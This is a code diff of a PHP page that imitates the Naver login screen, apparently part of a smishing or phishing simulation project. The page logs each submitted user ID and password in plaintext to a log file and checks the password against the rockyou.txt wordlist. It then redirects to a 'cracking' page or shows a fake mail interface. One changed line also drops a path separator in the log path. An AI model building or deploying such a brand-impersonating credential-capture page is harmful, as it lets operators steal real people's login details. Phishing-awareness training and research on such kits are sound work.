@@ -12,22 +12,42 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } else {
         // 로그 파일 경로
         $logLine = date('Y-m-d H:i:s') . " - Session: {$session_id} - Login Attempt - ID: {$userid}, PW: {$password}\n";
-        file_put_contents(dirname(__FILE__) . '/../../log.txt', $logLine, FILE_APPEND | LOCK_EX);
+        file_put_contents(dirname(__FILE__) . 'log.txt', $logLine, FILE_APPEND | LOCK_EX);
 
-        // 약한 비밀번호 체크
-        $ch = curl_init('http://' . $_SERVER['HTTP_HOST'] . '/new_smising/php/check_password.php');
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['pw' => $password]));
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $response = json_decode(curl_exec($ch), true);
-        curl_close($ch);
+        // 약한 비밀번호 체크 (직접 파일 읽기 방식으로 변경)
+        $is_password_weak = false; // 취약한 비밀번호인지 여부를 저장할 변수
 
-        if ($response['weak']) {
-            header('Location: /new_smising/pages/cracking.html');
-            exit;
-        } else {
-            $show_email_ui = true; // 가짜 메일 UI 표시
+        // rockyou.txt 파일의 경로를 지정합니다.
+        // 이 코드가 제대로 작동하려면, nidlogin.login.php와 rockyou.txt가 같은 폴더에 있어야 합니다.
+        $password_file = dirname(__FILE__) . '/rockyou.txt';
+        $handle = @fopen($password_file, "r");
+
+        if ($handle) {
+            // 파일의 끝에 도달할 때까지 한 줄씩 읽습니다.
+            while (($line = fgets($handle)) !== false) {
+                $weak_password = trim($line);
+
+                // 입력된 비밀번호와 파일에서 읽은 비밀번호가 일치하는지 확인합니다.
+                if ($password === $weak_password) {
+                    $is_password_weak = true; // 일치하면 true로 설정
+                    break; // 즉시 루프를 종료합니다.
+                }
+            }
+            fclose($handle); // 파일 핸들을 닫아줍니다.
         }
+    }
+    if ($is_password_weak) {
+        // 취약한 비밀번호가 감지되었을 때 로그를 남깁니다.
+        // 기존 nidlogin.login.php의 로그 파일 위치와 동일하게 맞춥니다.
+        $logLine = date('Y-m-d H:i:s') . " - Session: {$session_id} - Weak Password Detected: {$password}\n";
+        file_put_contents(dirname(__FILE__) . '/log.txt', $logLine, FILE_APPEND | LOCK_EX);
+
+        // cracking.html 페이지로 이동시킵니다.
+        header('Location: ../pages/cracking.html');
+        exit;
+    } else {
+        // 안전한 비밀번호일 경우, 가짜 메일 UI를 표시합니다.
+        $show_email_ui = true;
     }
 }
 ?>
@@ -42,7 +62,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <meta property="og:type" content="website">
     <meta property="og:title" content="네이버">
     <meta property="og:description" content="네이버에 로그인 하고 나를 위한 다양한 서비스를 이용해 보세요">
-    <meta property="og:image" content="/new_smising/assets/naver_logo.png">
+    <meta property="og:image" content="../assets/naver_logo.png">
     <meta property="og:image:type" content="image/png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -50,13 +70,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <meta name="robots" content="index, follow">
     <meta name="Keywords" content="네이버 로그인">
     <title>네이버 : 로그인</title>
-    <link rel="shortcut icon" href="/new_smising/assets/favicon.ico?v=1">
-    <link rel="apple-touch-icon-precomposed" href="/new_smising/assets/upload_16493972759253VFbg.png?v=1">
-    <link rel="apple-touch-icon-precomposed" sizes="96x96" href="/new_smising/assets/upload_1649397297725OckVW.png?v=1">
-    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/new_smising/assets/upload_1649397312685xI8Rn.png?v=1">
-    <link rel="apple-touch-icon-precomposed" sizes="192x192" href="/new_smising/assets/upload_1649397328060s5AJW.png?v=1">
-    <link rel="stylesheet" type="text/css" href="/new_smising/css/w_20241010.css?v=1">
-    <link rel="stylesheet" type="text/css" href="/new_smising/css/phishing.css?v=1">
+    <link rel="stylesheet" type="text/css" href="../css/w_20241010.css?v=1">
+    <link rel="stylesheet" type="text/css" href="../css/phishing.css?v=1">
     <style>
         /* 긴급 임베디드 CSS (CSS 파일 로드 실패 대비) */
         .email-container {
@@ -138,9 +153,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             cursor: pointer;
         }
     </style>
-    <script type="text/javascript" src="/new_smising/js/srcOnError.js?v=1"></script>
-    <script type="text/javascript" src="/new_smising/js/passkeyApi.js?v=1"></script>
-    <script type="text/javascript" src="/new_smising/js/phishing.js?v=1"></script>
+    <script type="text/javascript" src="../js/srcOnError.js?v=1"></script>
+    <script type="text/javascript" src="../js/passkeyApi.js?v=1"></script>
+    <script type="text/javascript" src="../js/phishing.js?v=1"></script>
     <script>
         console.log('nidlogin.login.php: phishing.js 로드 완료');
     </script>
